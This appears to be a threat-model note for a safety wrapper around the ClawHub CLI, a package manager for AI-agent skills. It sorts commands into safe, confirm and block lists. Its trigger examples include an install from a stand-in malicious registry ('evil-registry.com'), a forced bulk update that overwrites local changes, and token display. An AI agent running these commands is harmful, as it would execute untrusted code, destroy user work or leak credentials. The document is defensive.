# Risk Notes for safe-clawhub

## Threat Model Summary

The ClawHub CLI (`clawhub`) is a package manager for OpenClaw agent skills. It supports searching, installing, updating, listing, and publishing skills to/from the clawhub.com registry. Installation and updates download and execute third-party code. Publishing makes local skill code publicly available. Authentication uses tokens managed via `clawhub login`.

## Action Space

- **read**: `clawhub search`, `clawhub list`, `clawhub whoami`
- **write**: `clawhub install` (download and install skill), `clawhub update` (upgrade skill version)
- **destructive**: `clawhub update --force` (overwrite local changes), `clawhub update --all --force` (bulk force overwrite)
- **external**: All install/update/publish/search operations communicate with the clawhub.com registry (or custom `--registry`)
- **credential**: Auth tokens managed via `clawhub login`; stored locally; `CLAWHUB_REGISTRY` env variable

## Key Risks

### 1. Supply-Chain Attack via Untrusted Skill
- **Risk**: Installing a malicious or compromised skill executes arbitrary code in the agent environment.
- **Category**: Privilege escalation, External interaction
- **Trigger**: `clawhub install malicious-skill` from default or custom registry.
- **Mitigation**: Confirm all installs with skill name, version, and source. Block non-default registries.

### 2. Forced Bulk Updates
- **Risk**: `update --all --force` bypasses hash checks and overwrites all local skill modifications.
- **Category**: Irreversibility, Scope explosion
- **Trigger**: `clawhub update --all --no-input --force`
- **Mitigation**: Block blanket forced updates. Confirm individual updates with version and change details.

### 3. Accidental Publication
- **Risk**: Publishing incomplete, private, or unfinished skill code to a public registry.
- **Category**: Irreversibility, External interaction
- **Trigger**: `clawhub publish ./my-skill` without proper metadata review.
- **Mitigation**: Block publish without complete metadata (slug, name, version). Confirm with full preview.

### 4. Credential Exposure
- **Risk**: Auth tokens or registry credentials displayed in output or logs.
- **Category**: Credential exposure
- **Trigger**: Logging login flow, displaying token, or echoing env variables.
- **Mitigation**: Never display auth tokens. Allow `whoami` (shows identity, not token).

### 5. Custom Registry Redirect
- **Risk**: `--registry` flag or `CLAWHUB_REGISTRY` env redirects to malicious registry.
- **Category**: External interaction, Privilege escalation
- **Trigger**: `clawhub install skill --registry https://evil-registry.com`
- **Mitigation**: Block installs from non-default registries.

### 6. Version Drift
- **Risk**: Installing without pinned version (`@latest`) introduces untested code.
- **Category**: External interaction
- **Trigger**: `clawhub install my-skill` (defaults to latest).
- **Mitigation**: Prefer pinned versions; confirm version before install.

## Safe vs Unsafe

Safe:
- `clawhub search "query"`
- `clawhub list`
- `clawhub whoami`

Confirm:
- `clawhub install <skill>` (with or without version pin)
- `clawhub update <skill>` (single skill)
- `clawhub update --all` (without force)
- `clawhub update <skill> --force` (single skill, force)
- `clawhub publish` (with complete metadata)
- `clawhub login`

Block:
- `clawhub update --all --force` or `--all --no-input --force`
- install from non-default `--registry`
- publish without slug/name/version
- displaying auth tokens
